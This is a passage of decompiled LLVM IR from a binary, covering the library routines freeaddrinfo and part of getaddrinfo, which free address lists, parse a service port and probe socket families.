  uselistorder i32 %v1_26f80.pre, { 1, 0 }
  uselistorder i32 %v0_26f70, { 1, 0, 3, 2 }
  uselistorder i32 %v3_26f54, { 1, 0 }
  uselistorder i32 %v3_26f1057, { 3, 2, 1, 0 }
  uselistorder i32 %v0_26f64, { 1, 0 }
  uselistorder i32 %v1_26f04, { 1, 0 }
  uselistorder i32* %v1_26efc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_26ecc.pr, { 1, 2, 0, 3 }
  uselistorder i32 %v3_26e9c, { 1, 0, 2 }
  uselistorder i32 %v2_26e74, { 1, 2, 0 }
  uselistorder i32 %v2_26e68, { 2, 1, 0 }
  uselistorder i32 %v3_26dfc, { 1, 0 }
  uselistorder i32 %v3_26db847, { 3, 2, 1, 0 }
  uselistorder i32 %v0_26e0c, { 1, 0 }
  uselistorder i32 %v1_26dac, { 1, 0 }
  uselistorder i32* %v1_26da4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_26d60, { 1, 2, 0, 3 }
  uselistorder i32 %v3_26d28, { 1, 0, 2 }
  uselistorder i32 %v2_26d00, { 1, 2, 0 }
  uselistorder i32 %v2_26cf4, { 2, 1, 0 }
  uselistorder i32 %v0_26bb8, { 1, 0 }
  uselistorder i32 %v2_26fb8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_26b48, { 1, 0, 2 }
  uselistorder i32 %v1_26b30, { 1, 0 }
  uselistorder i32 %v0_26b18, { 1, 0 }
  uselistorder i32 %v2_26b10, { 1, 2, 3, 0 }
  uselistorder i32 %v3_26af0, { 1, 0 }
  uselistorder i32 %tmp276, { 1, 0 }
  uselistorder i32 %v3_26a50, { 1, 0 }
  uselistorder i32 %v1_26a40, { 1, 0 }
  uselistorder i32 %v0_26afc, { 4, 3, 1, 6, 5, 2, 9, 0, 7, 8, 10 }
  uselistorder i32 %v3_26944, { 1, 2, 0 }
  uselistorder i32 %v0_26928, { 0, 1, 2, 7, 8, 6, 5, 4, 3 }
  uselistorder i32 %v2_268bc, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v0_26898812172025, { 0, 2, 1 }
  uselistorder i32 %v0_268c8, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_268b0, { 1, 0 }
  uselistorder i32 %v0_26898, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 3, 4, 1, 5, 7, 6 }
  uselistorder i32* %stack_var_-216, { 0, 3, 1, 4, 2, 5, 7, 6 }
  uselistorder i8** %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 2, 3, 4, 5, 6, 7, 0, 17, 1, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %stack_var_-104, { 2, 1, 3, 0, 4 }
  uselistorder i32* %stack_var_-64, { 2, 3, 8, 0, 4, 5, 9, 1, 6, 7, 10 }
  uselistorder i32* %stack_var_-68, { 0, 3, 6, 1, 4, 7, 2, 5, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 10, 14, 11, 12, 13, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 38, 39, 40, 35, 36, 37, 41, 43, 44, 45, 46, 50, 51, 47, 48, 49, 52, 53, 54, 42, 100, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 74, 3, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 85, 86, 4, 88, 89, 90, 91, 92, 96, 97, 93, 94, 95, 98, 99, 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 32, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 21, 30, 31, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 26, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 7, 8, 11, 10, 12, 13, 14, 17, 15, 16, 20, 22, 18, 19, 21, 23, 24, 25, 26, 31, 27, 28, 73, 29, 30, 74, 38, 32, 33, 34, 35, 36, 37, 72, 40, 39, 47, 48, 41, 42, 43, 44, 45, 46, 71, 50, 49, 51, 53, 52, 55, 54, 56, 57, 58, 63, 59, 60, 61, 62, 65, 64, 69, 66, 67, 68, 70, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 9, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -65536, { 1, 0 }
  uselistorder i32 259, { 0, 1, 3, 2, 4 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 (i32)* @gaih_inet_serv, { 1, 0 }
  uselistorder i32 -36368, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_2730c, { 3, 11, 7, 8, 9, 10, 5, 2, 4, 0, 6, 1 }
  uselistorder label %dec_label_pc_272f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_272b8, { 1, 0 }
  uselistorder label %dec_label_pc_2728c, { 1, 0 }
  uselistorder label %dec_label_pc_2724c, { 1, 0 }
  uselistorder label %dec_label_pc_271b0, { 1, 0 }
  uselistorder label %bb314, { 1, 0 }
  uselistorder label %bb313, { 1, 0 }
  uselistorder label %dec_label_pc_2716c, { 1, 0 }
  uselistorder label %dec_label_pc_27158, { 1, 0 }
  uselistorder label %dec_label_pc_27118, { 1, 0 }
  uselistorder label %dec_label_pc_27094, { 1, 0 }
  uselistorder label %.thread75, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_27044, { 1, 0 }
  uselistorder label %dec_label_pc_27034, { 1, 0 }
  uselistorder label %.thread73, { 1, 0 }
  uselistorder label %dec_label_pc_27004, { 1, 0 }
  uselistorder label %dec_label_pc_26ff4, { 1, 0 }
  uselistorder label %dec_label_pc_26fa0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_26f88, { 1, 0 }
  uselistorder label %dec_label_pc_26f7c, { 1, 0 }
  uselistorder label %dec_label_pc_26f4c, { 1, 0 }
  uselistorder label %.thread58, { 1, 0 }
  uselistorder label %dec_label_pc_26eb4, { 1, 0 }
  uselistorder label %dec_label_pc_26e18, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_26df4, { 1, 0 }
  uselistorder label %.thread48, { 1, 0 }
  uselistorder label %bb293, { 2, 0, 1 }
  uselistorder label %dec_label_pc_26d40, { 1, 0 }
  uselistorder label %dec_label_pc_26ca8, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_26c1c, { 1, 0 }
  uselistorder label %bb285, { 1, 0 }
  uselistorder label %dec_label_pc_26ba8, { 1, 0 }
  uselistorder label %dec_label_pc_26b9c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_26b44, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_26af0, { 1, 0 }
  uselistorder label %bb281, { 1, 0 }
  uselistorder label %dec_label_pc_26ac0, { 1, 0 }
  uselistorder label %bb278, { 1, 0 }
  uselistorder label %dec_label_pc_26a40, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_269c8, { 1, 0 }
  uselistorder label %dec_label_pc_26964, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_2693c, { 1, 0 }
  uselistorder label %dec_label_pc_26930, { 1, 0 }
  uselistorder label %bb274, { 1, 0 }
  uselistorder label %bb273, { 1, 0 }
}

define i32 @freeaddrinfo(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_27340 = load i32, i32* @r4, align 4
  store i32 %v3_27340, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_273542 = icmp eq i32 %arg1, 0
  br i1 %v2_273542, label %dec_label_pc_2735c, label %dec_label_pc_2734c

dec_label_pc_2734c:                               ; preds = %entry, %dec_label_pc_2734c
  %v0_2734c = phi i32 [ %v0_27354.pr, %dec_label_pc_2734c ], [ %arg1, %entry ]
  %v1_2734c = add i32 %v0_2734c, 28
  %v2_2734c = inttoptr i32 %v1_2734c to i32*
  %v3_2734c = load i32, i32* %v2_2734c, align 4
  store i32 %v3_2734c, i32* @r4, align 4
  %v0_27350 = call i32 @free()
  %v0_27354.pr = load i32, i32* @r4, align 4
  store i32 %v0_27354.pr, i32* @r0, align 4
  %v2_27354 = icmp eq i32 %v0_27354.pr, 0
  br i1 %v2_27354, label %dec_label_pc_27354.dec_label_pc_2735c_crit_edge, label %dec_label_pc_2734c

dec_label_pc_27354.dec_label_pc_2735c_crit_edge:  ; preds = %dec_label_pc_2734c
  %v2_2735c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2735c

dec_label_pc_2735c:                               ; preds = %dec_label_pc_27354.dec_label_pc_2735c_crit_edge, %entry
  %v2_2735c = phi i32 [ %v2_2735c.pre, %dec_label_pc_27354.dec_label_pc_2735c_crit_edge ], [ %v3_27340, %entry ]
  store i32 %v2_2735c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_27354.pr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2734c, { 1, 0 }
}

define i32 @getaddrinfo(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i8*, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v3_27364 = load i32, i32* @r4, align 4
  %v6_27364 = load i32, i32* @r5, align 4
  %v9_27364 = load i32, i32* @r6, align 4
  %v12_27364 = load i32, i32* @r7, align 4
  %v15_27364 = load i32, i32* @r8, align 4
  %v27_27364 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r8, align 4
  %v3_27370 = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* %stack_var_-104, align 4
  br i1 %v3_27370, label %thread-pre-split, label %dec_label_pc_27388

dec_label_pc_27388:                               ; preds = %entry
  %v2_27388 = load i8, i8* %arg1, align 1
  %v7_2738c = icmp eq i8 %v2_27388, 42
  br i1 %v7_2738c, label %dec_label_pc_27394, label %thread-pre-split

dec_label_pc_27394:                               ; preds = %dec_label_pc_27388
  %v1_27394 = add i32 %tmp, 1
  %v2_27394 = inttoptr i32 %v1_27394 to i8*
  %v3_27394 = load i8, i8* %v2_27394, align 1
  %v2_27398 = icmp eq i8 %v3_27394, 0
  br i1 %v2_27398, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_27394
  store i32 0, i32* @r8, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_27388, %dec_label_pc_27394, %bb, %entry
  %v0_273c0 = phi i32 [ %tmp, %entry ], [ 0, %bb ], [ %tmp, %dec_label_pc_27394 ], [ %tmp, %dec_label_pc_27388 ]
  %v2_273a0 = icmp eq i32 %arg2, 0
  br i1 %v2_273a0, label %bb68, label %dec_label_pc_273a8

dec_label_pc_273a8:                               ; preds = %thread-pre-split
  %v1_273a8 = inttoptr i32 %arg2 to i8*
  %v2_273a8 = load i8, i8* %v1_273a8, align 1
  %v7_273ac = icmp eq i8 %v2_273a8, 42
  br i1 %v7_273ac, label %dec_label_pc_273b4, label %bb68

dec_label_pc_273b4:                               ; preds = %dec_label_pc_273a8
  %v1_273b4 = add i32 %arg2, 1
  %v2_273b4 = inttoptr i32 %v1_273b4 to i8*
  %v3_273b4 = load i8, i8* %v2_273b4, align 1
  %v2_273b8 = icmp eq i8 %v3_273b4, 0
  br i1 %v2_273b8, label %bb67, label %bb68

bb67:                                             ; preds = %dec_label_pc_273b4
  store i32 0, i32* @r5, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_273a8, %thread-pre-split, %dec_label_pc_273b4, %bb67
  %v1_273c0 = phi i32 [ %arg2, %dec_label_pc_273a8 ], [ 0, %thread-pre-split ], [ %arg2, %dec_label_pc_273b4 ], [ 0, %bb67 ]
  %v2_273c0 = or i32 %v1_273c0, %v0_273c0
  %v4_273c0 = icmp eq i32 %v2_273c0, 0
  br i1 %v4_273c0, label %dec_label_pc_27630, label %dec_label_pc_273c8

dec_label_pc_273c8:                               ; preds = %bb68
  %v2_273c8 = icmp eq i32 %arg3, 0
  br i1 %v2_273c8, label %dec_label_pc_273d0, label %dec_label_pc_273e8

dec_label_pc_273d0:                               ; preds = %dec_label_pc_273c8
  %v2_273d0 = ptrtoint i32* %stack_var_-88 to i32
  store i32 0, i32* @r1, align 4
  store i32 %v2_273d0, i32* @r0, align 4
  store i32 32, i32* @r2, align 4
  %v0_273e0 = call i32 @__GI_memset()
  store i32 %v0_273e0, i32* %r0.global-to-local, align 4
  store i32 %v2_273d0, i32* @r6, align 4
  br label %dec_label_pc_273e8

dec_label_pc_273e8:                               ; preds = %dec_label_pc_273c8, %dec_label_pc_273d0
  %v0_273e8 = phi i32 [ %arg3, %dec_label_pc_273c8 ], [ %v2_273d0, %dec_label_pc_273d0 ]
  %v1_273e8 = inttoptr i32 %v0_273e8 to i32*
  %v2_273e8 = load i32, i32* %v1_273e8, align 4
  %v1_273f0 = and i32 %v2_273e8, -1088
  %v2_273f4 = icmp eq i32 %v1_273f0, 0
  br i1 %v2_273f4, label %dec_label_pc_273fc, label %dec_label_pc_27638

dec_label_pc_273fc:                               ; preds = %dec_label_pc_273e8
  %v0_273fc = load i32, i32* @r8, align 4
  %v1_273fc = sub i32 1, %v0_273fc
  %v2_273fc = icmp ult i32 %v0_273fc, 2
  br i1 %v2_273fc, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_273fc
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_273fc, %bb69
  %v0_27404 = phi i32 [ %v1_273fc, %dec_label_pc_273fc ], [ 0, %bb69 ]
  %v4_27404 = udiv i32 %v2_273e8, 2
  %v5_27404 = and i32 %v0_27404, %v4_27404
  %v6_27404 = icmp eq i32 %v5_27404, 0
  br i1 %v6_27404, label %dec_label_pc_2740c, label %dec_label_pc_27638

dec_label_pc_2740c:                               ; preds = %bb70
  %v0_2740c = load i32, i32* @r5, align 4
  %v2_2740c = icmp eq i32 %v0_2740c, 0
  br i1 %v2_2740c, label %dec_label_pc_2746c, label %dec_label_pc_27414

dec_label_pc_27414:                               ; preds = %dec_label_pc_2740c
  %v1_27414 = inttoptr i32 %v0_2740c to i8*
  %v2_27414 = load i8, i8* %v1_27414, align 1
  %v2_27418 = icmp eq i8 %v2_27414, 0
  br i1 %v2_27418, label %dec_label_pc_2746c, label %dec_label_pc_27420

dec_label_pc_27420:                               ; preds = %dec_label_pc_27414
  store i32 %v0_2740c, i32* @r0, align 4
  %v2_27424 = ptrtoint i8** %stack_var_-48 to i32
  store i32 %v2_27424, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v4_27430 = call i32 @strtoul(i32 %v0_2740c, i32 %v2_27424, i32 10)
  store i32 %v4_27430, i32* %r0.global-to-local, align 4
  %v3_27434 = load i8*, i8** %stack_var_-48, align 4
  %v2_2743c = load i8, i8* %v3_27434, align 1
  %v2_27440 = icmp eq i8 %v2_2743c, 0
  br i1 %v2_27440, label %bb71, label %dec_label_pc_2744c

bb71:                                             ; preds = %dec_label_pc_27420
  br label %dec_label_pc_27474

dec_label_pc_2744c:                               ; preds = %dec_label_pc_27420
  %v0_2744c = load i32, i32* @r6, align 4
  %v1_2744c = inttoptr i32 %v0_2744c to i32*
  %v2_2744c = load i32, i32* %v1_2744c, align 4
  %v1_27450 = and i32 %v2_2744c, 1024
  %v2_27450 = icmp eq i32 %v1_27450, 0
  br i1 %v2_27450, label %dec_label_pc_27458, label %dec_label_pc_27630

dec_label_pc_27458:                               ; preds = %dec_label_pc_2744c
  br label %dec_label_pc_27474

dec_label_pc_2746c:                               ; preds = %dec_label_pc_27414, %dec_label_pc_2740c
  br label %dec_label_pc_27474

dec_label_pc_27474:                               ; preds = %dec_label_pc_2746c, %bb71, %dec_label_pc_27458
  %v2_27474 = load i32, i32* %stack_var_-104, align 4
  %v2_2747c = icmp eq i32 %v2_27474, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_2747c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_27474
  %v3_27484 = ptrtoint i32* %stack_var_-44 to i32
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_27474, %bb72
  %v1_27488 = phi i32 [ 0, %dec_label_pc_27474 ], [ %v3_27484, %bb72 ]
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_27494 = load i32, i32* @r7, align 4
  %v2_27494 = add i32 %v0_27494, -144
  store i32 %v2_27494, i32* @r7, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  %v1_275d88392 = add i32 %v0_27494, -140
  %v2_275d88493 = inttoptr i32 %v1_275d88392 to i32*
  %v3_275d88594 = load i32, i32* %v2_275d88493, align 4
  store i32 %v3_275d88594, i32* %r0.global-to-local, align 4
  %v2_275dc8796 = icmp eq i32 %v3_275d88594, 0
  br i1 %v2_275dc8796, label %dec_label_pc_275e4, label %dec_label_pc_274a8.lr.ph.lr.ph

dec_label_pc_274a8.lr.ph.lr.ph:                   ; preds = %bb73
  %stack_var_-96.1 = select i1 %v2_2747c, i32 0, i32 %v1_27488
  br label %dec_label_pc_274a8.lr.ph

dec_label_pc_274a8:                               ; preds = %dec_label_pc_274a8.lr.ph, %.thread6
  %v0_274a8 = phi i32 [ %v0_274a8.pre, %dec_label_pc_274a8.lr.ph ], [ %v0_2757c, %.thread6 ]
  %stack_var_-100.189 = phi i32 [ %stack_var_-100.1.ph99, %dec_label_pc_274a8.lr.ph ], [ %v1_2753c, %.thread6 ]
  %v0_274ac88 = phi i32 [ %v0_275d83697, %dec_label_pc_274a8.lr.ph ], [ %v1_27590, %.thread6 ]
  %v1_274a8 = add i32 %v0_274a8, 4
  %v2_274a8 = inttoptr i32 %v1_274a8 to i32*
  %v3_274a8 = load i32, i32* %v2_274a8, align 4
  %v1_274ac = inttoptr i32 %v0_274ac88 to i32*
  %v2_274ac = load i32, i32* %v1_274ac, align 4
  %v9_274b0 = icmp eq i32 %v3_274a8, %v2_274ac
  br i1 %v9_274b0, label %dec_label_pc_274c0, label %dec_label_pc_274b8

dec_label_pc_274b8:                               ; preds = %dec_label_pc_274a8
  %v2_274b8 = icmp eq i32 %v3_274a8, 0
  br i1 %v2_274b8, label %dec_label_pc_274c0, label %dec_label_pc_275d4

dec_label_pc_274c0:                               ; preds = %dec_label_pc_274b8, %dec_label_pc_274a8
  %v1_274c0 = inttoptr i32 %v0_274a8 to i32*
  %v2_274c0 = load i32, i32* %v1_274c0, align 4
  %v1_274c4 = and i32 %v2_274c0, 32
  %v2_274c4 = icmp eq i32 %v1_274c4, 0
  br i1 %v2_274c4, label %dec_label_pc_27534, label %dec_label_pc_274cc

dec_label_pc_274cc:                               ; preds = %dec_label_pc_274c0
  %v3_274d0 = urem i32 %v2_274ac, 65536
  %v0_274d4 = call i32 @__GI___errno_location()
  store i32 %v0_274d4, i32* %r0.global-to-local, align 4
  %v7_274d8 = icmp eq i32 %v3_274d0, 2
  store i32 %v0_274d4, i32* @r5, align 4
  %v1_274e0 = inttoptr i32 %v0_274d4 to i32*
  %v2_274e0 = load i32, i32* %v1_274e0, align 4
  store i32 %v2_274e0, i32* %sb.global-to-local, align 4
  br i1 %v7_274d8, label %dec_label_pc_27524, label %dec_label_pc_274e8

dec_label_pc_274e8:                               ; preds = %dec_label_pc_274cc
  %v7_274e8 = icmp eq i32 %v3_274d0, 10
  br i1 %v7_274e8, label %bb74, label %dec_label_pc_274f4

bb74:                                             ; preds = %dec_label_pc_274e8
  br label %dec_label_pc_27528

dec_label_pc_274f4:                               ; preds = %dec_label_pc_274e8
  store i32 %v3_274d0, i32* %r0.global-to-local, align 4
  %v3_27500 = call i32 @socket(i32 %v3_274d0, i32 2, i32 0)
  store i32 %v3_27500, i32* %r0.global-to-local, align 4
  %v1_27504 = icmp slt i32 %v3_27500, 0
  br i1 %v1_27504, label %dec_label_pc_2750c, label %dec_label_pc_27520

dec_label_pc_2750c:                               ; preds = %dec_label_pc_274f4
  %v0_2750c = load i32, i32* @r5, align 4
  %v1_2750c = inttoptr i32 %v0_2750c to i32*
  %v2_2750c = load i32, i32* %v1_2750c, align 4
  %v7_27510 = icmp eq i32 %v2_2750c, 24
  br i1 %v7_27510, label %dec_label_pc_27524, label %bb75

bb75:                                             ; preds = %dec_label_pc_2750c
  br label %dec_label_pc_27528

dec_label_pc_27520:                               ; preds = %dec_label_pc_274f4
  %v1_27520 = call i32 @__GI_close(i32 %v3_27500)
  store i32 %v1_27520, i32* %r0.global-to-local, align 4
  %v1_2752c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_27524

dec_label_pc_27524:                               ; preds = %dec_label_pc_2750c, %dec_label_pc_274cc, %dec_label_pc_27520
  %v1_2752c.pre = phi i32 [ %v0_2750c, %dec_label_pc_2750c ], [ %v0_274d4, %dec_label_pc_274cc ], [ %v1_2752c.pre.pre, %dec_label_pc_27520 ]
  br label %dec_label_pc_27528

dec_label_pc_27528:                               ; preds = %bb74, %bb75, %dec_label_pc_27524
  %v1_2752c = phi i32 [ %v0_2750c, %bb75 ], [ %v0_274d4, %bb74 ], [ %v1_2752c.pre, %dec_label_pc_27524 ]
  %v0_27528 = phi i1 [ true, %bb75 ], [ false, %bb74 ], [ false, %dec_label_pc_27524 ]
  %v0_2752c = load i32, i32* %sb.global-to-local, align 4
  %v2_2752c = inttoptr i32 %v1_2752c to i32*
  store i32 %v0_2752c, i32* %v2_2752c, align 4
  br i1 %v0_27528, label %dec_label_pc_27528.dec_label_pc_275d4.loopexit_crit_edge, label %dec_label_pc_27534

dec_label_pc_27528.dec_label_pc_275d4.loopexit_crit_edge: ; preds = %dec_label_pc_27528
  %v0_275d4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_275d4

dec_label_pc_27534:                               ; preds = %dec_label_pc_27528, %dec_label_pc_274c0
  %v0_27538 = load i32, i32* %sl.global-to-local, align 4
  %v2_27538 = icmp eq i32 %v0_27538, 0
  %v1_2753c = add i32 %stack_var_-100.189, 1
  br i1 %v2_27538, label %dec_label_pc_27534.dec_label_pc_27558_crit_edge, label %dec_label_pc_27548

dec_label_pc_27534.dec_label_pc_27558_crit_edge:  ; preds = %dec_label_pc_27534
  %v0_27568.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_27558

dec_label_pc_27548:                               ; preds = %dec_label_pc_27534
  %v1_27548 = add i32 %v0_27538, 4
  %v2_27548 = inttoptr i32 %v1_27548 to i32*
  %v3_27548 = load i32, i32* %v2_27548, align 4
  %v0_2754c = load i32, i32* @r7, align 4
  %v1_2754c = add i32 %v0_2754c, 4
  %v2_2754c = inttoptr i32 %v1_2754c to i32*
  %v3_2754c = load i32, i32* %v2_2754c, align 4
  %v9_27550 = icmp eq i32 %v3_27548, %v3_2754c
  br i1 %v9_27550, label %dec_label_pc_275d4, label %dec_label_pc_27558

dec_label_pc_27558:                               ; preds = %dec_label_pc_27534.dec_label_pc_27558_crit_edge, %dec_label_pc_27548
  %v0_27568 = phi i32 [ %v0_27568.pre, %dec_label_pc_27534.dec_label_pc_27558_crit_edge ], [ %v0_2754c, %dec_label_pc_27548 ]
  %v0_27558 = load i32, i32* @r8, align 4
  store i32 %v0_27558, i32* %r0.global-to-local, align 4
  %v1_27568 = add i32 %v0_27568, 4
  %v2_27568 = inttoptr i32 %v1_27568 to i32*
  %v3_27568 = load i32, i32* %v2_27568, align 4
  store i32 161140, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_27568)
  store i32 %v0_27558, i32* @r4, align 4
  %v2_27574 = icmp eq i32 %v0_27558, 0
  br i1 %v2_27574, label %dec_label_pc_275a8, label %dec_label_pc_2757c

dec_label_pc_2757c:                               ; preds = %dec_label_pc_27558
  %v0_2757c = load i32, i32* @r6, align 4
  %v1_2757c = add i32 %v0_2757c, 4
  %v2_2757c = inttoptr i32 %v1_2757c to i32*
  %v3_2757c = load i32, i32* %v2_2757c, align 4
  %v2_27580 = icmp eq i32 %v3_2757c, 0
  br i1 %v2_27580, label %dec_label_pc_27588, label %dec_label_pc_27598

dec_label_pc_27588:                               ; preds = %dec_label_pc_2757c
  %v1_27588 = and i32 %v0_27558, 256
  %v2_27588 = icmp eq i32 %v1_27588, 0
  br i1 %v2_27588, label %dec_label_pc_27598, label %.thread6

.thread6:                                         ; preds = %dec_label_pc_27588
  store i32 %v0_27558, i32* %fp.global-to-local, align 4
  %v1_27590 = load i32, i32* @r7, align 4
  store i32 %v1_27590, i32* %sl.global-to-local, align 4
  %v1_275d8 = add i32 %v1_27590, 4
  %v2_275d8 = inttoptr i32 %v1_275d8 to i32*
  %v3_275d8 = load i32, i32* %v2_275d8, align 4
  store i32 %v3_275d8, i32* %r0.global-to-local, align 4
  %v2_275dc = icmp eq i32 %v3_275d8, 0
  br i1 %v2_275dc, label %dec_label_pc_275e4, label %dec_label_pc_274a8

dec_label_pc_27598:                               ; preds = %dec_label_pc_27588, %dec_label_pc_2757c
  %v3_27598 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_27598, i32* %r0.global-to-local, align 4
  %v1_2759c = call i32 @freeaddrinfo(i32 %v3_27598)
  store i32 %v1_2759c, i32* %r0.global-to-local, align 4
  %storemerge.in.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_27628

dec_label_pc_275a8:                               ; preds = %dec_label_pc_27558
  %v2_275ac = icmp eq i32 %stack_var_-96.5.ph98, 0
  br i1 %v2_275ac, label %dec_label_pc_275d0, label %dec_label_pc_275c0.preheader

dec_label_pc_275c0.preheader:                     ; preds = %dec_label_pc_275a8
  %v1_275c420 = inttoptr i32 %stack_var_-96.5.ph98 to i32*
  %v2_275c421 = load i32, i32* %v1_275c420, align 4
  %v2_275c823 = icmp eq i32 %v2_275c421, 0
  br i1 %v2_275c823, label %dec_label_pc_275d0, label %dec_label_pc_275b8

dec_label_pc_275b8:                               ; preds = %dec_label_pc_275c0.preheader, %dec_label_pc_275b8
  %v0_275b8 = phi i32 [ %v2_275c4, %dec_label_pc_275b8 ], [ %v2_275c421, %dec_label_pc_275c0.preheader ]
  %v1_275b8 = add i32 %v0_275b8, 28
  %v1_275c4 = inttoptr i32 %v1_275b8 to i32*
  %v2_275c4 = load i32, i32* %v1_275c4, align 4
  %v2_275c8 = icmp eq i32 %v2_275c4, 0
  br i1 %v2_275c8, label %dec_label_pc_275c0.dec_label_pc_275d0.loopexit_crit_edge, label %dec_label_pc_275b8

dec_label_pc_275c0.dec_label_pc_275d0.loopexit_crit_edge: ; preds = %dec_label_pc_275b8
  br label %dec_label_pc_275d0

dec_label_pc_275d0:                               ; preds = %dec_label_pc_275c0.preheader, %dec_label_pc_275c0.dec_label_pc_275d0.loopexit_crit_edge, %dec_label_pc_275a8
  %stack_var_-96.3 = phi i32 [ 0, %dec_label_pc_275a8 ], [ %v1_275b8, %dec_label_pc_275c0.dec_label_pc_275d0.loopexit_crit_edge ], [ %stack_var_-96.5.ph98, %dec_label_pc_275c0.preheader ]
  %v0_275d0 = load i32, i32* @r7, align 4
  store i32 %v0_275d0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_275d4

dec_label_pc_275d4:                               ; preds = %dec_label_pc_274b8, %dec_label_pc_27548, %dec_label_pc_27528.dec_label_pc_275d4.loopexit_crit_edge, %dec_label_pc_275d0
  %v0_275d4 = phi i32 [ %v0_275d0, %dec_label_pc_275d0 ], [ %v0_275d4.pre.pre, %dec_label_pc_27528.dec_label_pc_275d4.loopexit_crit_edge ], [ %v0_2754c, %dec_label_pc_27548 ], [ %v0_274ac88, %dec_label_pc_274b8 ]
  %stack_var_-96.4 = phi i32 [ %stack_var_-96.3, %dec_label_pc_275d0 ], [ %stack_var_-96.5.ph98, %dec_label_pc_27528.dec_label_pc_275d4.loopexit_crit_edge ], [ %stack_var_-96.5.ph98, %dec_label_pc_27548 ], [ %stack_var_-96.5.ph98, %dec_label_pc_274b8 ]
  %stack_var_-100.0 = phi i32 [ %v1_2753c, %dec_label_pc_275d0 ], [ %stack_var_-100.189, %dec_label_pc_27528.dec_label_pc_275d4.loopexit_crit_edge ], [ %v1_2753c, %dec_label_pc_27548 ], [ %stack_var_-100.189, %dec_label_pc_274b8 ]
  %v1_275d4 = add i32 %v0_275d4, 8
  store i32 %v1_275d4, i32* @r7, align 4
  %v1_275d883 = add i32 %v0_275d4, 12
  %v2_275d884 = inttoptr i32 %v1_275d883 to i32*
  %v3_275d885 = load i32, i32* %v2_275d884, align 4
  store i32 %v3_275d885, i32* %r0.global-to-local, align 4
  %v2_275dc87 = icmp eq i32 %v3_275d885, 0
  br i1 %v2_275dc87, label %dec_label_pc_275e4, label %dec_label_pc_274a8.lr.ph

dec_label_pc_274a8.lr.ph:                         ; preds = %dec_label_pc_274a8.lr.ph.lr.ph, %dec_label_pc_275d4
